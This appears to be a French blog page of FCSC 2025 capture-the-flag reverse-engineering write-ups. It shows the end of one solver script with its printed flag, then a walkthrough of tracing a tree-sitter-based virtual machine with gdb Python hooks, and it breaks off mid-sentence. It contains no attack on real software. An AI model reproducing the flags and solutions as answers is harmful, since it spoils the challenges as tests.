0x67172D37B77DAEFE99DB1D1FF04FBED5, 0x4325F6DFDC17B3D93A437A2FD174192F, 0xB6CEB5305C48B5C137C1EEC542DD7AB5, 0x36DE1DABA4D0C410A59ABC08D9270088, 0x4FB98600728660ADC7EB49ABF5F4BB97, 0xBD7A8C92FE4A7BD964145C1B415E27FE, ] for i in range(255): s = Solver() x = BitVec(\u0026#39;x\u0026#39;, 128) y = BitVecVal(round_values[(i + 1) % len(round_values)], 128) s.add(block(x, y) == BitVecVal(round_values[i % len(round_values)], 128)) if s.check() == sat: m = s.model() round_values[i % len(round_values)] = m[x].as_long() else: print(\u0026#34;no solution found ...\u0026#34;) exit() print(b\u0026#39;\u0026#39;.join(x.to_bytes(16, \u0026#34;little\u0026#34;) for x in round_values[::-1])) et on obtiens notre flag en sortie !\n╭─trikkss@arch-linux ~/ctf/FCSC-2025/reverse/chatouille ╰─➤ python3 final-solve.py b\u0026#39;FCSC{Shoh4IeFohmee1oichoo5iujohze2riPuuroochoh3vi0aGai5ae5aithooph2wohquai2takaeng9eeF3ue8QuooT2shiege5ee5ahL1vanoAnZ}\\x80\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x03\\xb0\u0026#39; ","permalink":"https://trikkss.github.io/posts/fcsc2025_chatouille/","summary":"Write up du challenge Chatouille","title":"FCSC 2025 - Chatouille"},{"content":"vous pouvez retrouver les fichiers joint avec le chall ici\nDécouverte du challenge Dans ce challenge de reverse, on tombait sur une VM un peu spéciale, fonctionnant à l\u0026rsquo;aide de tree-sitter.\nTree-sitter est une bibliothèque qui sert à analyser du code source de manière rapide et structurée.\nElle transforme un fichier de code en un arbre syntaxique (AST) facilement parcourable, avec des mises à jour incrémentales en temps réel, idéal pour des outils comme les éditeurs de texte ou l\u0026rsquo;analyse de code.\nSource : ChatGPT\nDans ce writeup, on va voir comment résoudre un challenge de reverse de VM sans nécessairement avoir besoin de comprendre le fonctionnement de celle-ci.\nL\u0026rsquo;archive fournie avec le challenge nous donne 4 fichiers :\nun ELF fcsclang une lib partagée libfcsclang.so un programme pour la vm program.fcsc un fichier Dockerfile un fichier run.sh permettant de lancer le docker Analyse du binaire Lorsque l\u0026rsquo;on ouvre la fonction principale du binaire on observe que celui-ci prend en argument un fichier contenant un programme pour la VM, initialise un parser et va parser notre programme à l\u0026rsquo;aide tree-sitter.\n__int64 __fastcall main(__int64 a1, char **a2, char **a3) { __int64 v4; // rax int v5; // eax size_t v6; // rax _QWORD v7[4]; // [rsp+10h] [rbp-F0h] BYREF _BYTE v8[8]; // [rsp+30h] [rbp-D0h] BYREF unsigned int v9; // [rsp+38h] [rbp-C8h] stat buf; // [rsp+40h] [rbp-C0h] BYREF __int64 v11; // [rsp+D8h] [rbp-28h] unsigned __int64 st_size; // [rsp+E0h] [rbp-20h] FILE *stream; // [rsp+E8h] [rbp-18h] __int64 v14; // [rsp+F0h] [rbp-10h] unsigned __int64 i; // [rsp+F8h] [rbp-8h] if ( (int)a1 \u0026gt; 1 ) { v14 = ts_parser_new(a1, a2, a3); v4 = tree_sitter_fcsclang(); ts_parser_set_language(v14, v4); stream = fopen(a2[1], \u0026#34;r\u0026#34;); if ( stream ) { v5 = fileno(stream); fstat(v5, \u0026amp;buf); st_size = buf.st_size; program = do_malloc(buf.st_size); for ( i = 0LL; i \u0026lt; st_size; i += v6 ) v6 = fread(program, 1uLL, st_size - i, stream); v11 = ts_parser_parse_string(v14, 0LL, program, (unsigned int)st_size); if ( v11 ) { qword_7150 = (__int64)sub_1561(); qword_7158 = sub_3A01(); sub_1329(v11, v7); exec_instr((__int64)v7, (__int64)v8); sub_1657(qword_7150); sub_3A52((_QWORD *)qword_7158); free(program); ts_tree_delete(v11); ts_parser_delete(v14); return v9; } else { return 0xFFFFFFFFLL; } } else { return 0xFFFFFFFFLL; } } else { printf(\u0026#34;Usage: %s \u0026lt;program\u0026gt;\\n\u0026#34;, *a2); return 0xFFFFFFFFLL; } } Lorsque l\u0026rsquo;on lance le binaire, celui-ci se lance mais rien ne semble se passer. Je décide donc de lancer un ltrace avec celui-ci afin d\u0026rsquo;avoir une idée de ce qu\u0026rsquo;il se passe. Pour ce faire, on modifie l\u0026rsquo;entrypoint de notre Dockerfile par [\u0026quot;ltrace\u0026quot;, \u0026quot;./fcsclang\u0026quot;, \u0026quot;program.fcsc\u0026quot;] et on relance notre programme.\nLa trace d\u0026rsquo;exécution générée par ltrace est conséquente, on va donc pipe celle-ci vers vscode.\nrun.sh 2\u0026gt;\u0026amp;1 | code - Si nous jetons un oeil à la trace d\u0026rsquo;exécution, nous pouvoir voir l\u0026rsquo;initialisation du parser\nts_parser_new(3, 0x7ffcd3821168, 0x7ffcd3821188, 0x63b3a1e11db8) = 0x63b3b18622a0 tree_sitter_fcsclang(0x63b3b1862a40, 232, 1, 0) = 0x715c8c6a0d80 ts_parser_set_language(0x63b3b18622a0, 0x715c8c6a0d80, 0x715c8c6a0d80, 0) = 1 fopen(\u0026#34;program.fcsc\u0026#34;, \u0026#34;r\u0026#34;) = 0x63b3b1862ea0 Et surtout nous pouvons voir qu\u0026rsquo;il prend notre entrée et va effectuer un atoi dessus. Cette fonction permet de convertir une string en entier.\ngetline(\u0026#34;aaaaaaa\\n\u0026#34;, 120, 0x715c8c3008e0) = 8 atoi(0x63b3b18cf140, 0xa61616161616161, 1, 0xa61616161616161) = 0 En parcourant rapidemment les fonctions, on trouve la fonction que j\u0026rsquo;ai renommé exec_instr qui semble intéressante. Celle-ci contient un switch-case semblant contenir les différentes instructions de la machine virtuelle. Certaines instructions ont des noms explicites, tandis que d\u0026rsquo;autres, qui commencent par undocumented_, sont beaucoup moins parlantes.\n__int64 __fastcall exec_instr(__int64 a1, __int64 a2) { char *s1; // [rsp+18h] [rbp-8h] if ( (unsigned __int8)sub_1A2C(a1) ) { fwrite(\u0026#34;Syntax error\\n\u0026#34;, 1uLL, 0xDuLL, stderr); exit(1); } s1 = (char *)get_node_type(a1); if ( !strcmp(s1, \u0026#34;function_definition\u0026#34;) ) return sub_30AF(a1, a2); if ( !strcmp(s1, \u0026#34;number\u0026#34;) ) return sub_1C3A(a1, a2); if ( !strcmp(s1, \u0026#34;undocumented_732293a7c7094ffd\u0026#34;) ) return set_0(a1, a2); if ( !strcmp(s1, \u0026#34;undocumented_f9bfceb10223dcd6\u0026#34;) ) return set_1(a1, a2); if ( !strcmp(s1, \u0026#34;undocumented_d53cabc7357ff2a5\u0026#34;) ) return set_2(a1, a2); if ( !strcmp(s1, \u0026#34;undocumented_210eb81a94b8b633\u0026#34;) ) return set_3(a1, a2); if ( !strcmp(s1, \u0026#34;undocumented_c589a8f3aaff75f7\u0026#34;) ) return set_4(a1, a2); if ( !strcmp(s1, \u0026#34;undocumented_ac7469dafc6e9c77\u0026#34;) ) return set_5(a1, a2); if ( !strcmp(s1, \u0026#34;undocumented_8212463fe42cc213\u0026#34;) ) return set_6(a1, a2); if ( !strcmp(s1, \u0026#34;undocumented_791df7d09856e81f\u0026#34;) ) return set_7(a1, a2); if ( !strcmp(s1, \u0026#34;undocumented_db9dce746e821769\u0026#34;) ) return set_8(a1, a2); if ( !strcmp(s1, \u0026#34;undocumented_ac3fcec30d0b6a40\u0026#34;) ) return set_9(a1, a2); if ( !strcmp(s1, \u0026#34;str\u0026#34;) ) return get_string(a1, a2); if ( !strcmp(s1, \u0026#34;array\u0026#34;) ) return get_array(a1, a2); if ( !strcmp(s1, \u0026#34;identifier\u0026#34;) ) return sub_22FC(a1, a2); if ( !strcmp(s1, \u0026#34;function_call\u0026#34;) ) return function_call(a1, a2); if ( !strcmp(s1, \u0026#34;scope\u0026#34;) ) return sub_306B(a1, a2); if ( !strcmp(s1, \u0026#34;lvalue\u0026#34;) ) return sub_2192(a1, a2); if ( !strcmp(s1, \u0026#34;assign\u0026#34;) ) return assign(a1, a2); if ( !strcmp(s1, \u0026#34;subscript\u0026#34;) ) return subscript(a1, a2); if ( !strcmp(s1, \u0026#34;binexp\u0026#34;) ) return do_operation(a1, a2); if ( !strcmp(s1, \u0026#34;unexp\u0026#34;) ) return do_unexp(a1, a2); if ( !strcmp(s1, \u0026#34;undocumented_9bfdf82a969d10c2\u0026#34;) ) return get_user_input(a1, a2); if ( !strcmp(s1, \u0026#34;undocumented_af0dbc52101afc49\u0026#34;) ) return maybe_a_printf(a1, a2); if ( !strcmp(s1, \u0026#34;undocumented_0fe135eb8cd073ef\u0026#34;) ) return sub_2C3C(a1, a2); if ( !strcmp(s1, \u0026#34;undocumented_48359b1cc713e5a1\u0026#34;) ) return sub_2CCD(a1, a2); if ( !strcmp(s1, \u0026#34;undocumented_c44ff70e0a035b84\u0026#34;) ) return sub_2D91(a1, a2); return sub_1B7A(a1, a2); } On peut par exemple retrouver l\u0026rsquo;instruction undocumented_9bfdf82a969d10c2 qui fait un getline et un atoi, on peut donc en déduire que c\u0026rsquo;est cette fonction va lire notre entrée utilisateur.\ngetline(\u0026amp;lineptr, \u0026amp;n, stdin); v5 = atoi(lineptr); Reverse de la VM A partir de là, ma façon de procéder pour le reverse de VM est de chercher pour des instructions intéressantes et hook celles-ci afin de générer une trace d\u0026rsquo;exécution et potentiellement comprendre le programme en entrée sans avoir à comprendre le fonctionnement de la machine virtuelle. Je trouve donc la fonction que j\u0026rsquo;ai renommé do_operation() qui semble particulièrement intéressante.\n__int64 __fastcall do_operation(_QWORD *a1, __int64 a2) { _BOOL4 v3; // eax int v4; // [rsp+10h] [rbp-90h] BYREF __int64 v5; // [rsp+18h] [rbp-88h] int v6; // [rsp+20h] [rbp-80h] BYREF __int64 v7; // [rsp+28h] [rbp-78h] _QWORD v8[4]; // [rsp+30h] [rbp-70h] BYREF _QWORD v9[4]; // [rsp+50h] [rbp-50h] BYREF _QWORD v10[5]; // [rsp+70h] [rbp-30h] BYREF char *s1; // [rsp+98h] [rbp-8h] search_node_child_by_field_name(a1, \u0026#34;op\u0026#34;, v10); search_node_child_by_field_name(v10, \u0026#34;left\u0026#34;, v9); search_node_child_by_field_name(v10, \u0026#34;right\u0026#34;, v8); exec_instr((__int64)v9, (__int64)\u0026amp;v6); exec_instr((__int64)v8, (__int64)\u0026amp;v4); s1 = (char *)get_node_type(v10); if ( v6 != 1 || v4 != 1 ) { fwrite(\u0026#34;Invalid type\\n\u0026#34;, 1uLL, 0xDuLL, stderr); exit(1); } if ( !strcmp(s1, \u0026#34;undocumented_46eb8e8b7b15c3d5\u0026#34;) ) return sub_3BF0((int)v5 + (int)v7, a2); if ( !strcmp(s1, \u0026#34;undocumented_cfd09200be51d38f\u0026#34;) ) return sub_3BF0((int)v7 - (int)v5, a2); if ( !strcmp(s1, \u0026#34;undocumented_b341f271c655aaee\u0026#34;) ) return sub_3BF0((int)v7 * (int)v5, a2); if ( !strcmp(s1, \u0026#34;undocumented_956dd300d7424ff3\u0026#34;) ) return sub_3BF0(v7 == v5, a2); if ( !strcmp(s1, \u0026#34;undocumented_0162f13a50afff09\u0026#34;) ) return sub_3BF0(v7 != v5, a2); if ( !strcmp(s1, \u0026#34;undocumented_a91bdbbce9e82238\u0026#34;) ) return sub_3BF0((unsigned int)v7 \u0026lt; (unsigned int)v5, a2); if ( !strcmp(s1, \u0026#34;undocumented_589a700aed48e3a4\u0026#34;) ) return sub_3BF0((unsigned int)v5 \u0026lt; (unsigned int)v7, a2); if ( !strcmp(s1, \u0026#34;undocumented_2d5b46a88151170b\u0026#34;) ) return sub_3BF0((unsigned int)v5 \u0026gt;= (unsigned int)v7, a2); if ( !strcmp(s1, \u0026#34;undocumented_4c3cc3b8907e3db5\u0026#34;) ) return sub_3BF0((unsigned int)v7 \u0026gt;= (unsigned int)v5, a2); if ( !strcmp(s1, \u0026#34;undocumented_aa1bd5b44f53714d\u0026#34;) ) { v3 = v7 \u0026amp;\u0026amp; v5; return sub_3BF0(v3, a2); } if ( !strcmp(s1, \u0026#34;undocumented_0e772940f0fd3008\u0026#34;) ) { v3 = v7 || v5; return sub_3BF0(v3, a2); } if ( !strcmp(s1, \u0026#34;undocumented_13932b8a4b1bd439\u0026#34;) ) return sub_3BF0((_DWORD)v7 \u0026lt;\u0026lt; v5, a2); if ( !strcmp(s1, \u0026#34;undocumented_0cd2df8843187030\u0026#34;) ) return sub_3BF0((unsigned int)v7 \u0026gt;\u0026gt; v5, a2); if ( !strcmp(s1, \u0026#34;undocumented_b858202486aecd0f\u0026#34;) ) return sub_3BF0((unsigned int)v5 | (unsigned int)v7, a2); if ( strcmp(s1, \u0026#34;undocumented_24e094c9759dc06c\u0026#34;) ) { fwrite(\u0026#34;Not implemented\\n\u0026#34;, 1uLL, 0x10uLL, stderr); exit(1); } return sub_3BF0((unsigned int)v5 \u0026amp; (unsigned int)v7, a2); } En effet, dans cette fonction se trouve un switch case pour différentes opérations mathématiques et binaire. Ce sera donc notre premier hook.\nJ\u0026rsquo;ai pour cela simplement utilisé un script gdb avec python. J\u0026rsquo;ai également exporté les symboles depuis IDA à l\u0026rsquo;aide de l\u0026rsquo;extension syms2elf.\nimport gdb class BreakDoOperation(gdb.Breakpoint): def __init__(self): super().__init__(\u0026#39;*do_operation + 244\u0026#39;, internal=False) def stop(self): try: rdi = gdb.parse_and_eval(\u0026#34;$rdi\u0026#34;) char_ptr = rdi.cast(gdb.lookup_type(\u0026#34;char\u0026#34;).pointer()) string = char_ptr.string() except Exception as e: print(f\u0026#34;Unable to read string at $rdi: {e}\u0026#34;) v5 = gdb.parse_and_eval(\u0026#34;*(int*)($rbp - 0x88)\u0026#34;) v7 = gdb.parse_and_eval(\u0026#34;*(int*)($rbp - 0x78)\u0026#34;) if string == \u0026#34;undocumented_46eb8e8b7b15c3d5\u0026#34;: print(f\u0026#34;{v5} + {v7}\u0026#34;) elif string == \u0026#34;undocumented_cfd09200be51d38f\u0026#34;: print(f\u0026#34;{v7} - {v5}\u0026#34;) elif string == \u0026#34;undocumented_b341f271c655aaee\u0026#34;: print(f\u0026#34;{v7} * {v5}\u0026#34;) elif string == \u0026#34;undocumented_956dd300d7424ff3\u0026#34;: print(f\u0026#34;{v7} == {v5}\u0026#34;) elif string == \u0026#34;undocumented_0162f13a50afff09\u0026#34;: print(f\u0026#34;{v7} != {v5}\u0026#34;) elif string == \u0026#34;undocumented_a91bdbbce9e82238\u0026#34;: print(f\u0026#34;{v7} \u0026lt; {v5}\u0026#34;) elif string == \u0026#34;undocumented_589a700aed48e3a4\u0026#34;: print(f\u0026#34;{v5} \u0026lt; {v7}\u0026#34;) elif string == \u0026#34;undocumented_2d5b46a88151170b\u0026#34;: print(f\u0026#34;{v5} \u0026gt;= {v7}\u0026#34;) elif string == \u0026#34;undocumented_4c3cc3b8907e3db5\u0026#34;: print(f\u0026#34;{v7} \u0026gt;= {v5}\u0026#34;) elif string == \u0026#34;undocumented_aa1bd5b44f53714d\u0026#34;: print(f\u0026#34;{v7} \u0026amp;\u0026amp; {v5}\u0026#34;) elif string == \u0026#34;undocumented_0e772940f0fd3008\u0026#34;: print(f\u0026#34;{v7} || {v5}\u0026#34;) elif string == \u0026#34;undocumented_13932b8a4b1bd439\u0026#34;: print(f\u0026#34;{v7} \u0026lt;\u0026lt; {v5}\u0026#34;) elif string == \u0026#34;undocumented_0cd2df8843187030\u0026#34;: print(f\u0026#34;{v7} \u0026gt;\u0026gt; {v5}\u0026#34;) elif string == \u0026#34;undocumented_b858202486aecd0f\u0026#34;: print(f\u0026#34;{v5} | {v7}\u0026#34;) elif string == \u0026#34;undocumented_24e094c9759dc06c\u0026#34;: print(f\u0026#34;{v5} \u0026amp; {v7}\u0026#34;) else: print(\u0026#34;not implemented !!!!\u0026#34;) return False De plus, j\u0026rsquo;ai hooké les fonctions qui étaient \u0026ldquo;guessable\u0026rdquo; à partir de leur noms ou en survolant rapidemment leur code.\nfunction_names = [ \u0026#34;do_unexp\u0026#34;, \u0026#34;maybe_a_printf\u0026#34;, \u0026#34;get_user_input\u0026#34;, \u0026#34;function_call\u0026#34;, \u0026#34;get_array\u0026#34;, \u0026#34;get_string\u0026#34;, # j\u0026#39;ai renommé ces fonctions ainsi car elles semblaient mettre des valeurs de 0 à 9, peut être un push sur une stack ou un registre, je n\u0026#39;ai pas creusé mais ça nous permet d\u0026#39;avoir une idée dans notre trace. \u0026#34;set_0\u0026#34;, \u0026#34;set_1\u0026#34;, \u0026#34;set_2\u0026#34;, \u0026#34;set_3\u0026#34;, \u0026#34;set_4\u0026#34;, \u0026#34;set_5\u0026#34;, \u0026#34;set_6\u0026#34;, \u0026#34;set_7\u0026#34;, \u0026#34;set_8\u0026#34;, \u0026#34;set_9\u0026#34; ] class FunctionBreakpoint(gdb.Breakpoint): def __init__(self, func_name): super().__init__(func_name, internal=False) self.func_name = func_name def stop(self): print(f\u0026#34;executing {self.func_name}\u0026#34;) return False Maintenant si on relance le binaire avec le Dockerfile suivant :\nFROM debian:sid RUN apt update \u0026amp;\u0026amp; apt install -y libtree-sitter-dev=0.22.6-6 ltrace gdb python3 COPY . /fcsclang WORKDIR /fcsclang ENV LD_LIBRARY_PATH . ENTRYPOINT [\u0026#34;gdb\u0026#34;, \u0026#34;-q\u0026#34;, \u0026#34;-ex\u0026#34;, \u0026#34;source gdb_do_operation_hook.py\u0026#34;, \u0026#34;-ex\u0026#34;, \u0026#34;run program.fcsc\u0026#34;, \u0026#34;-ex\u0026#34;, \u0026#34;quit\u0026#34;, \u0026#34;fcsclang_symbols\u0026#34;] On obtient en sortie une trace d\u0026rsquo;exécution gigantesque.\nOn peut tout de même voir que dans les premières instructions le programme semble stocker l\u0026rsquo;entrée utilisateur dans un tableau 9x9.\n0 \u0026lt; 9 executing set_0 executing set_9 0 \u0026lt; 9 executing get_user_input executing set_1 1 + 0 executing set_9 1 \u0026lt; 9 executing get_user_input executing set_1 1 + 1 executing set_9 2 \u0026lt; 9 executing get_user_input executing set_1 1 + 2 executing set_9 3 \u0026lt; 9 executing get_user_input executing set_1 [...] Malheureusement, la trace d\u0026rsquo;exécution étant beaucoup trop grande, il est très compliqué de comprendre son fonctionnement. Heureusement, le programme semble utiliser des fonctions ! Dans le switch case permettant de gérer les instructions de la machine virtuelle on retrouve un appel très intéressant : function_call\nOn va donc créer 2 hook, un function_call et un function_end, ainsi il sera possible de séparer les traces d\u0026rsquo;executions par fonction et de grandement simplifier le processus de reverse.\nclass BreakFunctionCall(gdb.Breakpoint): def __init__(self): super().__init__(\u0026#39;*function_call + 66\u0026#39;, internal=False) def stop(self): try: rax = gdb.parse_and_eval(\u0026#34;$rax\u0026#34;) char_ptr = rax.cast(gdb.lookup_type(\u0026#34;char\u0026#34;).pointer()) string = char_ptr.string() print(f\u0026#34;calling function {string}\u0026#34;) except Exception as e: print(f\u0026#34;Unable to read string at $rdi: {e}\u0026#34;) class ExitingFunctionCall(gdb.Breakpoint): def __init__(self): super().__init__(\u0026#39;*function_call + 308\u0026#39;, internal=False) def stop(self): try: rax = gdb.parse_and_eval(\u0026#34;$rax\u0026#34;) char_ptr = rax.cast(gdb.lookup_type(\u0026#34;char\u0026#34;).pointer()) string = char_ptr.string() print(f\u0026#34;end of function {string}\u0026#34;) except Exception as e: print(f\u0026#34;Unable to read string at $rdi: {e}\u0026#34;) Un dernier hook qui me semble important est le hook de subscript, celui-ci va nous permettre de voir quel element d\u0026rsquo;une array est lu.\nclass BreakSubscript(gdb.Breakpoint): def __init__(self): super().__init__(\u0026#34;*subscript + 221\u0026#34;, internal=False) def stop(self): rdx = gdb.parse_and_eval(\u0026#34;$rdx\u0026#34;) print(f\u0026#34;get array[{rdx}]\u0026#34;) return False Voici le script complet permettant de générer notre trace d\u0026rsquo;exécution :\nimport gdb class BreakFunctionCall(gdb.Breakpoint): def __init__(self): super().__init__(\u0026#39;*function_call + 66\u0026#39;, internal=False) def stop(self): try: rax = gdb.parse_and_eval(\u0026#34;$rax\u0026#34;) char_ptr = rax.cast(gdb.lookup_type(\u0026#34;char\u0026#34;).pointer()) string = char_ptr.string() print(f\u0026#34;calling function {string}\u0026#34;) except Exception as e: print(f\u0026#34;Unable to read string at $rdi: {e}\u0026#34;) class ExitingFunctionCall(gdb.Breakpoint): def __init__(self): super().__init__(\u0026#39;*function_call + 308\u0026#39;, internal=False) def stop(self): try: rax = gdb.parse_and_eval(\u0026#34;$rax\u0026#34;) char_ptr = rax.cast(gdb.lookup_type(\u0026#34;char\u0026#34;).pointer()) string = char_ptr.string() print(f\u0026#34;end of function {string}\u0026#34;) except Exception as e: print(f\u0026#34;Unable to read string at $rdi: {e}\u0026#34;) class FunctionBreakpoint(gdb.Breakpoint): def __init__(self, func_name): super().__init__(func_name, internal=False) self.func_name = func_name def stop(self): print(f\u0026#34;executing {self.func_name}\u0026#34;) return False class BreakDoOperation(gdb.Breakpoint): def __init__(self): super().__init__(\u0026#39;*do_operation + 244\u0026#39;, internal=False) def stop(self): print(\u0026#34;\\nBreakpoint at do_operation+244\u0026#34;) try: rdi = gdb.parse_and_eval(\u0026#34;$rdi\u0026#34;) char_ptr = rdi.cast(gdb.lookup_type(\u0026#34;char\u0026#34;).pointer()) string = char_ptr.string() except Exception as e: print(f\u0026#34;Unable to read string at $rdi: {e}\u0026#34;) v5 = gdb.parse_and_eval(\u0026#34;*(int*)($rbp - 0x88)\u0026#34;) v7 = gdb.parse_and_eval(\u0026#34;*(int*)($rbp - 0x78)\u0026#34;) if string == \u0026#34;undocumented_46eb8e8b7b15c3d5\u0026#34;: print(f\u0026#34;{v5} + {v7}\u0026#34;) elif string == \u0026#34;undocumented_cfd09200be51d38f\u0026#34;: print(f\u0026#34;{v7} - {v5}\u0026#34;) elif string == \u0026#34;undocumented_b341f271c655aaee\u0026#34;: print(f\u0026#34;{v7} * {v5}\u0026#34;) elif string == \u0026#34;undocumented_956dd300d7424ff3\u0026#34;: print(f\u0026#34;{v7} == {v5}\u0026#34;) elif string == \u0026#34;undocumented_0162f13a50afff09\u0026#34;: print(f\u0026#34;{v7} != {v5}\u0026#34;) elif string == \u0026#34;undocumented_a91bdbbce9e82238\u0026#34;: print(f\u0026#34;{v7} \u0026lt; {v5}\u0026#34;) elif string == \u0026#34;undocumented_589a700aed48e3a4\u0026#34;: print(f\u0026#34;{v5} \u0026lt; {v7}\u0026#34;) elif string == \u0026#34;undocumented_2d5b46a88151170b\u0026#34;: print(f\u0026#34;{v5} \u0026gt;= {v7}\u0026#34;) elif string == \u0026#34;undocumented_4c3cc3b8907e3db5\u0026#34;: print(f\u0026#34;{v7} \u0026gt;= {v5}\u0026#34;) elif string == \u0026#34;undocumented_aa1bd5b44f53714d\u0026#34;: print(f\u0026#34;{v7} \u0026amp;\u0026amp; {v5}\u0026#34;) elif string == \u0026#34;undocumented_0e772940f0fd3008\u0026#34;: print(f\u0026#34;{v7} || {v5}\u0026#34;) elif string == \u0026#34;undocumented_13932b8a4b1bd439\u0026#34;: print(f\u0026#34;{v7} \u0026lt;\u0026lt; {v5}\u0026#34;) elif string == \u0026#34;undocumented_0cd2df8843187030\u0026#34;: print(f\u0026#34;{v7} \u0026gt;\u0026gt; {v5}\u0026#34;) elif string == \u0026#34;undocumented_b858202486aecd0f\u0026#34;: print(f\u0026#34;{v5} | {v7}\u0026#34;) elif string == \u0026#34;undocumented_24e094c9759dc06c\u0026#34;: print(f\u0026#34;{v5} \u0026amp; {v7}\u0026#34;) else: print(\u0026#34;not implemented !!!!\u0026#34;) return False class BreakGetString(gdb.Breakpoint): def __init__(self): super().__init__(\u0026#39;*get_string + 97\u0026#39;, internal=False) def stop(self): try: rdi = gdb.parse_and_eval(\u0026#34;$rdi\u0026#34;) char_ptr = rdi.cast(gdb.lookup_type(\u0026#34;char\u0026#34;).pointer()) string = char_ptr.string() print(f\u0026#34;getting string {string}\u0026#34;) except Exception as e: print(f\u0026#34;Unable to read string at $rdi: {e}\u0026#34;) class BreakSubscript(gdb.Breakpoint): def __init__(self): super().__init__(\u0026#34;*subscript + 221\u0026#34;, internal=False) def stop(self): rdx = gdb.parse_and_eval(\u0026#34;$rdx\u0026#34;) print(f\u0026#34;get array[{rdx}]\u0026#34;) return False BreakDoOperation() BreakFunctionCall() ExitingFunctionCall() BreakGetString() BreakSubscript() function_names = [ \u0026#34;do_unexp\u0026#34;, \u0026#34;assign\u0026#34;, \u0026#34;maybe_a_printf\u0026#34;, \u0026#34;get_user_input\u0026#34;, \u0026#34;function_call\u0026#34;, \u0026#34;get_array\u0026#34;, \u0026#34;set_0\u0026#34;, \u0026#34;set_1\u0026#34;, \u0026#34;set_2\u0026#34;, \u0026#34;set_3\u0026#34;, \u0026#34;set_4\u0026#34;, \u0026#34;set_5\u0026#34;, \u0026#34;set_6\u0026#34;, \u0026#34;set_7\u0026#34;, \u0026#34;set_8\u0026#34;, \u0026#34;set_9\u0026#34; ] for name in function_names: FunctionBreakpoint(name) Etude du programme Il est maintenant temps de commencer à étudier le programme.\nPour ça j\u0026rsquo;ai utilisé le script suivant :\nfrom pwn import * p = process(\u0026#34;./run.sh\u0026#34;) for i in range(9*9): p.sendline(f\u0026#34;1337{i:02}\u0026#34;) p.interactive() Celui-ci envoie des valeurs commençant par 1337, ainsi il est facilement possible de les retrouver dans notre trace d\u0026rsquo;exécution. De plus la valeur i nous permet de connaitre l\u0026rsquo;index dans notre tableau, si l\u0026rsquo;opération est effectuée sur 133714 on pourra en déduire qu’il a effectué l’opération sur user_input[14 // 9][14 % 9] -\u0026gt; user_input[1][5].\nDurant le reverse, j\u0026rsquo;ai également utilisé d\u0026rsquo;autres valeurs que 1337XX afin d\u0026rsquo;étudier les différents comportements et ne rien louper.\nJe vais ici détailler seulement une ou deux fonctions de la trace d\u0026rsquo;exécution afin de ne pas rendre l\u0026rsquo;article trop assommant car le processus ensuite est très répétitif.\nJe vous ai néanmoins mis une trace d\u0026rsquo;exécution d\u0026rsquo;exemple ici si vous souhaitez voir à quoi cela ressemble.\nAfin d\u0026rsquo;avoir une vision plus clair de l\u0026rsquo;execution des fonctions, on peut faire un grep de calling|end of sur notre trace d\u0026rsquo;exécution, ainsi après avoir indenté tout ça on se retrouve avec quelque chose de plus clair. On distingue par exemple des appels répétitifs, on peut deviner que ce sont probablement des boucles, etc.\ncalling function pipe end of function pipe calling function lancinante calling function bidonner calling function inattendu end of function inattendu calling function inattendu end of function inattendu calling function inattendu end of function inattendu calling function inattendu end of function inattendu calling function inattendu end of function inattendu calling function inattendu end of function inattendu calling function inattendu end of function inattendu calling function inattendu end of function inattendu calling function inattendu end of function inattendu end of function bidonner calling function symboles calling function mendiant end of function mendiant calling function mendiant end of function mendiant calling function mendiant end of function mendiant calling function mendiant end of function mendiant calling function mendiant end of function mendiant calling function mendiant end of function mendiant calling function mendiant end of function mendiant calling function mendiant end of function mendiant calling function mendiant end of function mendiant calling function mendiant end of function mendiant end of function symboles calling function discutable calling function aux calling function copie end of function copie end of function aux calling function aux calling function copie end of function copie end of function aux calling function aux calling function copie end of function copie end of function aux calling function aux calling function copie end of function copie end of function aux calling function aux calling function copie end of function copie end of function aux calling function aux calling function copie end of function copie end of function aux calling function aux calling function copie end of function copie end of function aux calling function aux calling function copie end of function copie end of function aux calling function aux calling function copie end of function copie end of function aux end of function discutable calling function ferrailleur calling function gerber calling function central end of function central end of function gerber calling function gerber calling function central end of function central end of function gerber calling function gerber calling function central end of function central end of function gerber calling function gerber calling function central end of function central end of function gerber calling function gerber calling function central end of function central end of function gerber calling function gerber calling function central end of function central end of function gerber calling function gerber calling function central end of function central end of function gerber calling function gerber calling function central end of function central end of function gerber calling function gerber calling function central end of function central end of function gerber calling function gerber calling function central end of function central end of function gerber calling function gerber calling function central end of function central end of function gerber calling function gerber calling function central end of function central end of function gerber calling function gerber calling function central end of function central end of function gerber calling function gerber calling function central end of function central end of function gerber calling function gerber calling function central end of function central end of function gerber calling function gerber calling function central end of function central end of function gerber calling function gerber calling function central end of function central end of function gerber calling function gerber calling function central end of function central end of function gerber calling function gerber calling function central end of function central end of function gerber calling function gerber calling function central end of function central end of function gerber calling function gerber calling function central end of function central end of function gerber calling function gerber calling function central end of function central end of function gerber calling function gerber calling function central end of function central end of function gerber calling function gerber calling function central end of function central end of function gerber calling function gerber calling function central end of function central end of function gerber calling function gerber calling function central end of function central end of function gerber calling function gerber calling function central end of function central end of function gerber end of function ferrailleur end of function lancinante La première fonction pipe va lire l\u0026rsquo;entrée utilisateur.\nNous allons en premier nous intéresser à la fonction innatendue.\nEn analysant cette fonction, on retrouve 9 fois le même pattern, on peut donc en déduire que c\u0026rsquo;est une boucle. On retrouve également la condition suivante à chaque itération du pattern : 0 \u0026lt; 9.\nJe vous ai mis ici 2 itérations de cette boucle :\nget array[0] Breakpoint at do_operation+244 1 \u0026lt;\u0026lt; 133700 Breakpoint at do_operation+244 16 \u0026amp; 0 Breakpoint at do_operation+244 1 \u0026amp;\u0026amp; 1 Breakpoint at do_operation+244 9 \u0026gt;= 133700 Breakpoint at do_operation+244 0 \u0026lt; 133700 Breakpoint at do_operation+244 0 \u0026amp;\u0026amp; 1 Breakpoint at do_operation+244 0 \u0026amp;\u0026amp; 1 Breakpoint at do_operation+244 16 | 0 Breakpoint at do_operation+244 1 + 0 Breakpoint at do_operation+244 1 \u0026lt; 9 get array[1] Breakpoint at do_operation+244 1 \u0026lt;\u0026lt; 133701 Breakpoint at do_operation+244 32 \u0026amp; 16 Breakpoint at do_operation+244 1 \u0026amp;\u0026amp; 0 Breakpoint at do_operation+244 9 \u0026gt;= 133701 Breakpoint at do_operation+244 0 \u0026lt; 133701 Breakpoint at do_operation+244 0 \u0026amp;\u0026amp; 1 Breakpoint at do_operation+244 0 \u0026amp;\u0026amp; 0 Breakpoint at do_operation+244 32 | 16 Breakpoint at do_operation+244 1 + 1 Le code semble itérer sur la première ligne de notre entrée utilsateur, il va 